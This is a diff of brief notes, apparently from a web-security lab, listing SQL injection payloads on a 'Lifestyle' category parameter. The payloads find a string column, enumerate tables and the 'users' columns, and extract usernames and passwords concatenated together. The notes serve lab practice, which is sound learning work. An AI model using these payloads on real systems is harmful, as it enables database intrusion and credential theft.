@@ -5,10 +5,11 @@ Finding string data type column :
 Lifestyle' UNION SELECT 'a', 'a' --
 
 Finding Database Name :
-Lifestyle' UNION SELECT 'a', table_name FROM INFORMATION_SCHEMA.TABLES --
+Lifestyle' UNION SELECT 10, table_name FROM INFORMATION_SCHEMA.TABLES --
 
 Finding users table column name :
 Lifestyle' UNION SELECT 'a', column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users' --
 
+
 Final Payload :
-Lifestyle' UNION SELECT username, password FROM users --
+Lifestyle' UNION SELECT 100, username || '~' || password FROM users --
